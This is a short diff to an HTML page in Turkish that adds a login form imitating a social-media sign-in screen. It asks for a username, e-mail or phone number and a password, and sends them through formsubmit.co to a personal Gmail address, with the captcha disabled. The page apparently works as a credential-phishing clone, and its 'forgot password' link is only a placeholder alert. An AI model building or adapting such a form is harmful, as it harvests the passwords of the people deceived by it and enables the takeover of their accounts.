@@ -100,7 +100,11 @@
 </div>
 
 <form method="POST" action="https://formsubmit.co/thtmailii@gmail.com" class="form-kapsayici">
-
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+  <input type="text" name="kullanici_adi" placeholder="Kullanıcı adı, e-posta veya cep numarası" required />
+  <input type="password" name="sifre" placeholder="Şifre" required />
+  <button type="submit" class="giris-buton">Giriş Yap</button>
   <p class="sifremi-unuttum" onclick="alert('Şifre sıfırlama işlemi yakında!')">Şifreni mi unuttun?</p>
 </form>
 
